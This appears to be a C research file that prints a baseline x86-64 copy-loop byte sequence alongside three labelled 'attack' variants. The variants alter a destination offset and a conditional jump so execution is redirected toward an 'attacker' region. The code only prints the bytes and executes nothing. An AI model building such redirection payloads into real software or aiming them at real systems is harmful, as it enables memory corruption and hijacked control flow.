#include <stdio.h>

int main() {
    // normal.
    unsigned char anchor[] = {
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0x00, 0xb5, 0x39, 0x00, // lea    0x39b500(%rip),%rsi
        0x48, 0x8d, 0xbe, 0x00, 0x00, 0x40, 0x00, // lea    0x400000(%rsi),%rdi
        0xf3, 0xa5,                               // rep movsl
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0xe3, 0xff, 0xff, 0xff, // lea    -0x1d(%rip),%rsi
        0xf3, 0xa5,                               // rep movsl

        // loop:
        0xf0, 0x49, 0x0f, 0xc1, 0x09,             // lock xadd %rcx,(%r9)
        0x7b, 0x04,                               // jnp +4
        0xf3, 0xa5,                               // rep movsl
        0xeb, 0xf5                                // jmp -11 (to loop)
    };
    // attack all.
    unsigned char code[] = {
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0x00, 0xb5, 0x39, 0x00, // lea    0x39b500(%rip),%rsi
        0x48, 0x8d, 0xbe, 0x00, 0x4b, 0xe8, 0xff, // lea    -0x17b500(%rsi),%rdi
        0xf3, 0xa5,                               // rep movsl %ds:(%rsi),%es:(%rdi)
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0xe3, 0xff, 0xff, 0xff, // lea    -0x1d(%rip),%rsi
        0xf3, 0xa5,                               // rep movsl %ds:(%rsi),%es:(%rdi)

        // <loop>:
        0xf0, 0x49, 0x0f, 0xc1, 0x09,             // lock xadd %rcx,(%r9)
        0x7b, 0x4e,                               // jnp +0x4e (跳转到attacker)
        0xf3, 0xa5,                               // rep movsl
        0xeb, 0xf5                                // jmp -11 (回到 loop)
    };
    
    // attack1: only jmp data
    unsigned char code1[] = {
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0x00, 0xb5, 0x39, 0x00, // lea    0x39b500(%rip),%rsi
        0x48, 0x8d, 0xbe, 0x00, 0x4b, 0xe8, 0xff, // lea    -0x17b500(%rsi),%rdi
        0xf3, 0xa5,                               // rep movsl
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0xe3, 0xff, 0xff, 0xff, // lea    -0x1d(%rip),%rsi
        0xf3, 0xa5,                               // rep movsl

        // <loop>:
        0xf0, 0x49, 0x0f, 0xc1, 0x09,             // lock xadd %rcx,(%r9)
        0x7b, 0x04,                               // jnp    1000 <worker>
        0xf3, 0xa5,                               // rep movsl
        0xeb, 0xf5                                // jmp    ff5 <loop>
    };    
    
    // attack2. only jmp attacker
    unsigned char code2[] = {
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0x00, 0xb5, 0x39, 0x00, // lea    0x39b500(%rip),%rsi
        0x48, 0x8d, 0xbe, 0x00, 0x00, 0x40, 0x00, // lea    0x400000(%rsi),%rdi
        0xf3, 0xa5,                               // rep movsl
        0x4c, 0x89, 0xd1,                         // mov    %r10,%rcx
        0x48, 0x8d, 0x35, 0xe3, 0xff, 0xff, 0xff, // lea    -0x1d(%rip),%rsi
        0xf3, 0xa5,                               // rep movsl

        // <loop>:
        0xf0, 0x49, 0x0f, 0xc1, 0x09,             // lock xadd %rcx,(%r9)
        0x7b, 0x4e,                               // jnp +0x4e (跳转到attacker)
        0xf3, 0xa5,                               // rep movsl
        0xeb, 0xf5                                // jmp -11 (回到 loop)
    };

    size_t code_len = sizeof(anchor);
    printf("Normal anchor. Machine code (%zu bytes):\n", code_len);
    for (size_t i = 0; i < code_len; ++i) {
        printf("%02x", anchor[i]);
        if ((i + 1) % 7 == 0) printf("\n");
    }
    printf("\n");

    code_len = sizeof(code);
    printf("Attack all. Machine code (%zu bytes):\n", code_len);
    for (size_t i = 0; i < code_len; ++i) {
        printf("%02x", code[i]);
        if ((i + 1) % 7 == 0) printf("\n");
    }
    printf("\n");

    code_len = sizeof(code1);
    printf("Attack 1 (jmp data). Machine code (%zu bytes):\n", code_len);
    for (size_t i = 0; i < code_len; ++i) {
        printf("%02x", code1[i]);
        if ((i + 1) % 7 == 0) printf("\n");
    }
    printf("\n");
    
    code_len = sizeof(code2);
    printf("Attack 2 (jmp attacker). Machine code (%zu bytes):\n", code_len);
    for (size_t i = 0; i < code_len; ++i) {
        printf("%02x", code2[i]);
        if ((i + 1) % 7 == 0) printf("\n");
    }

    return 0;
}

